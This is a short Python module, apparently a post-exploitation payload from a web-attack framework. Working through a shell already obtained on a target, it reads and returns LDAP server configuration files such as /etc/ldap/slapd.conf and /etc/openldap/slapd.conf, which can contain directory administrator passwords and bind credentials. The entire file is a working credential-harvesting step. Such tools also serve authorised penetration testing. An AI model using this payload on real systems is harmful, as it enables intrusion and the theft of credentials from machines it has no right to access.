import re
from plugins.attack.payloads.base_payload import base_payload

class ldap_config_files(base_payload):
    '''
    This payload shows LDAP configuration files
    '''
    def run_read(self):
        result = []
        files = []

        files.append('/etc/ldap/slapd.conf')
        files.append('/etc/openldap/slapd.conf')
        files.append('/etc/openldap/ldap.conf')
        files.append('/etc/ldap/myslapd.conf')
        files.append('/etc/ldap/lapd.conf')

        for file in files:
            if self.shell.read(file) != '':
                result.append('-------------------------')
                result.append('FILE => '+file)
                result.append(self.shell.read(file))

        result = [p for p in result if p != '']
        if result == [ ]:
            result.append('LDAP configuration files not found.')
        return result
        
